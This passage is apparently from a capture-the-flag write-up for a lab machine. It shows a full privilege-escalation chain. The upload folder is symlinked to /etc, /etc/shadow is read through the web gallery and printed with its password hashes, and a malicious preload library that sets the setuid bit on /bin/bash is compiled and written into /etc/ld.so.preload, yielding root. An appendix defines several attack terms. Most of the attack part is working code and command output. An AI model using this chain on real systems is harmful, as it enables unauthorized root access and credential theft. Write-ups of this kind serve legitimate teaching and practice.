root       458  1.3  1.7 401196 35592 ?        Sl   Oct01   1:55 /usr/bin/python3 /home/beth/.local/bin/gunicorn --config gunicorn_config.py app:app
root       460  1.3  1.7 401196 35680 ?        Sl   Oct01   1:55 /usr/bin/python3 /home/beth/.local/bin/gunicorn --config gunicorn_config.py app:app
beth     15971  0.0  0.0  14436  1084 pts/1    S+   00:23   0:00 grep --color=auto gunicorn

beth@london:~$ cat app.py | grep 'UPLOAD_FOLDER'
UPLOAD_FOLDER = 'uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
    filenames = os.listdir(app.config['UPLOAD_FOLDER'])
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

beth@london:~$ ls -lsa uploads
total 2232
   4 drwxrwxr-x  2 beth beth    4096 Apr 17 04:37 .
   4 drwxr-xr-x 11 beth beth    4096 Oct  1 23:57 ..
  68 -rw-r--r--  1 root root   69381 Apr 17 04:37 04.jpg
  56 -rw-r--r--  1 root root   54380 Apr 17 04:37 caption.jpg
  84 -rw-r--r--  1 root root   83547 Apr 17 04:36 e3.jpg
  16 -rw-r--r--  1 root root   14972 Apr 17 04:37 images.jpeg
 388 -rw-r--r--  1 root root  397225 Apr 17 04:36 Thames.jpg
1520 -rw-r--r--  1 root root 1554649 Apr 17 04:37 Untitled.png
  92 -rw-r--r--  1 root root   94062 Apr 17 04:37 www.usnews.jpeg

beth@london:~$ mv uploads/ uploads.bak
beth@london:~$ ln -s /etc uploads
beth@london:~$ ls -la uploads
lrwxrwxrwx 1 beth beth 4 Oct  2 00:26 uploads -> /etc
beth@london:~$ 
```

`curl -iLX GET http://londonbridge.thm:8080/gallery`

```bash
[REDACTED] - MORE

        
            <img class="image" src="/uploads/ld.so.cache" alt="ld.so.cache">
        
            <img class="image" src="/uploads/locale.alias" alt="locale.alias">
        
            <img class="image" src="/uploads/cron.hourly" alt="cron.hourly">
        
            <img class="image" src="/uploads/debian_version" alt="debian_version">
        
            <img class="image" src="/uploads/shadow-" alt="shadow-">
        
            <img class="image" src="/uploads/securetty" alt="securetty">
        
            <img class="image" src="/uploads/passwd-" alt="passwd-">
        
            <img class="image" src="/uploads/lsb-release" alt="lsb-release">
        
            <img class="image" src="/uploads/update-motd.d" alt="update-motd.d">

[REDACTED] - MORE
```

`curl -X GET http://londonbridge.thm:8080/uploads/shadow -o shadowssystem.txt`

```bash
root:$6$MuyQc/EB$TJ0f4UvSAQ/e8N2ehICim6KRPqsD2RBqQHRtaxluPLxeWazD3PU5RCc35JR62gKK6WvpA9v0r73jswtU4KSLU/:19792:0:99999:7:::
daemon:*:18484:0:99999:7:::
bin:*:18484:0:99999:7:::
sys:*:18484:0:99999:7:::
sync:*:18484:0:99999:7:::
games:*:18484:0:99999:7:::
man:*:18484:0:99999:7:::
lp:*:18484:0:99999:7:::
mail:*:18484:0:99999:7:::
news:*:18484:0:99999:7:::
uucp:*:18484:0:99999:7:::
proxy:*:18484:0:99999:7:::
www-data:*:18484:0:99999:7:::
backup:*:18484:0:99999:7:::
list:*:18484:0:99999:7:::
irc:*:18484:0:99999:7:::
gnats:*:18484:0:99999:7:::
nobody:*:18484:0:99999:7:::
systemd-network:*:18484:0:99999:7:::
systemd-resolve:*:18484:0:99999:7:::
syslog:*:18484:0:99999:7:::
messagebus:*:18484:0:99999:7:::
_apt:*:18484:0:99999:7:::
uuidd:*:19616:0:99999:7:::
beth:$6$A/tivpZQ$Cgshl0A8kvAR08NLdpSeeZwimPLbipJ.KrVuWVOvKu8AT7cl8b1J5.2VvaS0fu8sa74Jd7pdNpqN/gmFLOC6W.:19807:0:99999:7:::
sshd:*:19616:0:99999:7:::
charles:$6$yO4vvijF$RIQZn9g5y5s3cP61AvKHe9ou2miZgmPdzlf.4gWinIEaG4PyBFPm5cgm0OMQF18./TBhs48Q/UmjOCs/ye7dV0:19798:0:99999:7:::
```

```bash
beth@london:~$ cat app.py

[REDACTED] - MORE

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return "No file part"
    file = request.files['file']
    if file.filename == '':
        return "No selected file"
    if file:
        filename = secure_filename(file.filename)
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)
        if is_image(file_path):
            return redirect(url_for('gallery'))
        else:
            os.remove(file_path)  # Remove the non-image file
            return "Uploaded file is not an image"
    return "Invalid file"

[REDACTED] - MORE

beth@london:~$ nano /tmp/exp2.c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/chmod +s /bin/bash");
}

beth@london:~$ which gcc
/usr/bin/gcc
beth@london:~$ gcc -fPIC -shared -o /tmp/exp2.so /tmp/exp2.c -nostartfiles

beth@london:~$ ls -la /tmp/exp2.so
-rwxrwxr-x 1 beth beth 6456 Oct  2 00:34 /tmp/exp2.so
beth@london:~$ 

```

`nano ld.so.preload`

```bash
P6 1 1 1
/tmp/exp2.so
```

![image.png](image.png)

```bash
beth@london:~$ ping -c 1 127.0.0.1
ERROR: ld.so: object 'P6' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object '1' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object '1' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object '1' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.021 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.021/0.021/0.021/0.000 ms
beth@london:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
beth@london:~$ /bin/bash -p
bash-4.4# python3 -c 'import os;import pty;os.setuid(0);os.setgid(0);pty.spawn("/bin/bash");'
root@london:~# whoami
root
root@london:~# id
uid=0(root) gid=0(root) groups=0(root),1000(beth)
root@london:~# 

```

# Appendix

## HTTP Tampering

<aside>
💡

HTTP Tampering is a type of attack where an attacker manipulates or alters the HTTP requests or responses between a client (such as a web browser) and a server to achieve unauthorized actions, gain access to sensitive information, or exploit vulnerabilities in the web application. HTTP tampering can involve modifying headers, parameters, cookies, or the body of an HTTP request or response, leading to a wide range of security risks, including data theft, unauthorized access, or application manipulation.

</aside>

## SSRF (Server-Side Request Forgery)

<aside>
💡

SSRF (Server-Side Request Forgery) is a type of security vulnerability where an attacker manipulates a server to send malicious requests to unintended locations, often internal systems or external services. In an SSRF attack, the attacker tricks the server into making HTTP or other protocol requests on their behalf, allowing them to interact with services or systems that they wouldn't have access to directly. In SSRF, an attacker exploits functionality within a vulnerable web application that makes requests to remote resources. Instead of the request going to an intended resource (like a file, URL, or API), the attacker modifies the request to point to arbitrary locations.

</aside>

## URL Format Bypass

<aside>
💡

URL Format Bypass is a type of attack or vulnerability where an attacker manipulates or alters the format of a URL to bypass security controls, such as authentication, authorization, input validation, or access restrictions. This technique exploits the way a web application parses or handles URLs, often allowing unauthorized access to protected resources, bypassing filters, or circumventing security checks.

</aside>

## UID (User Identifier)

<aside>
💡

The UID is a unique numerical identifier assigned to each user account on the system. It is used to manage file ownership and system permissions. When a user logs in or runs a process, the system uses their UID to determine their permissions, such as which files they can access or modify. Each user has a UID associated with their account. For example, the root user, who has full system privileges, typically has a UID of 0.

</aside>

## GID (Group Identifier)

<aside>
💡

The GID is a unique identifier for groups, similar to the UID but for groups of users. Each group has a GID, and users can belong to one or more groups. A group allows users to share permissions, making it easier to manage access to files and resources. Every file on a Unix-like system has an owner (associated with a UID) and a group (associated with a GID). Permissions are assigned both at the user and group level, allowing fine-grained control over who can read, write, or execute the file. When a file is created, the system assigns both the UID of the user who created it and the GID of the user’s primary group.

</aside>